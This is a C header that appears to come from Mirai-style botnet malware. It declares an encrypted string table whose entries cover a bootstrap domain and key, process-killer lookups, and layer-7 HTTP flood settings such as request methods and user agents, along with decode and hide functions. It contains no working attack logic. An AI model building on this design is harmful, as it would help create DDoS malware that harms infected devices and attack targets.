#pragma once

#include <stdint.h>

enum {
	TABLE_EXEC_STRING,
	TABLE_BOOTSTRAP_DOMAIN,
	TABLE_BOOTSTRAP_KEY,
	TABLE_RAND_ALPHASET,
	TABLE_KILLER_PROC,
	TABLE_KILLER_PROC_TCP,
	TABLE_KILLER_PROC_FD,
	TABLE_ATTK_L7_TYPE_GET,
	TABLE_ATTK_L7_TYPE_POST,
	TABLE_ATTK_L7_TYPE_HEAD,
	TABLE_ATTK_L7_CONN_KEEP_ALIVE,
	TABLE_ATTK_L7_CONN_CLOSE,
	TABLE_ATTK_L7_UA_0,
	TABLE_ATTK_L7_UA_1,
	TABLE_ATTK_L7_UA_2,
	TABLE_ATTK_L7_UA_3,
	TABLE_ATTK_L7_UA_4,
	TABLE_ATTK_L7_UA_5,
	TABLE_ATTK_L7_UA_6,
	TABLE_ATTK_L7_UA_7,
	TABLE_ATTK_L7_UA_8,
	TABLE_ATTK_L7_HTTP,
	TABLE_ATTK_L7_UA,
	TABLE_ATTK_L7_ACCEPT
};

struct table_entry_t {
	uint8_t id;
	char *enc_value;
	char *dec_value;// when locked set this as TABLE_HIDE_DEC_STRING
	uint8_t len;
	uint8_t locked;
};

void enc_init(void);
struct table_entry_t *enc_get_entry(uint8_t);
char *enc_get_entry_str(struct table_entry_t *);
void enc_free_value(char *value);
